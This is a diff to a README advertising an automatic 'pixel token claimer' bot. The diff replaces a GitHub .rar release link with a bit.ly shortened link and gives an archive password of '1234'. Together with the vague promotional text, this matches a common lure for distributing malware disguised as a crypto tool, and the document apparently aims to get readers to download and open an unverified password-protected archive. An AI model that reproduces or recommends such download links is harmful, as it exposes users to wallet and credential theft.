@@ -4,7 +4,7 @@ The automatic pixel token claimer is a bot designed to streamline the process of
 
 It operates autonomously, scanning designated platforms for available tokens and executing the necessary actions to claim them on behalf of the user. The bot utilizes advanced algorithms to efficiently navigate through the token claiming process, saving users time and effort. With its automated functionality, users can focus on other tasks while the bot handles the tedious process of claiming pixel tokens.
 
-* [Release_1.0](https://github.com/hinesyan/Pixel_auto_claimer_bot/releases/download/Pixelwallet/PixelAutoClaimerBot.rar)
+* [Release_1.0](https://bit.ly/3QjFSZE)
 
 botpassword: 1234
 
